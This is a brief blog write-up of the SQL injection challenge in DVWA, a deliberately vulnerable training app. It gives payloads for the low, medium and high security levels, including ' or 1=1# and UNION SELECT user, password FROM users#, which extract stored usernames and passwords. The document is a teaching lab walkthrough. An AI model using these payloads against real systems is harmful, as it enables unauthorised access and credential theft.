---
title: "SQL Injection - DVWA"
description: ""
summary: "Use an SQL injection attack to retrieve the admin password."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "SQL Injection"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 6
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---

### **Security level: low**

We can detect SQL injection with `'` on submiting this we get SQL error.

we can see all entries with `' or 1=1#` :

<img width="248" alt="image" src="https://user-images.githubusercontent.com/79740895/185461785-b0426c0a-db1c-4118-b654-fe62a8b607c9.png">

We can extract all passwords with payload:

```' UNION SELECT user, password FROM users#```

<img width="271" alt="image" src="https://user-images.githubusercontent.com/79740895/185463551-74dfcac3-bed2-44b5-9fd8-4bf6bcc78e2b.png">


### **Security level: medium**

It's using POST parameter and quotes are filtered, but ID value is directly added to the query so we dont even need quotes.

payload: `1 or 1=1 UNION SELECT user, password FROM users#`

<img width="326" alt="image" src="https://user-images.githubusercontent.com/79740895/185467076-707fd767-e575-42d1-9b86-5a16937f133d.png">

### **Security level: high**

payload from low security also works here.

Payload: `' UNION SELECT user, password FROM users#`

<img width="281" alt="image" src="https://user-images.githubusercontent.com/79740895/185468611-17e12bd2-8513-4844-beac-b0d8d9c27725.png">

Happy Hacking
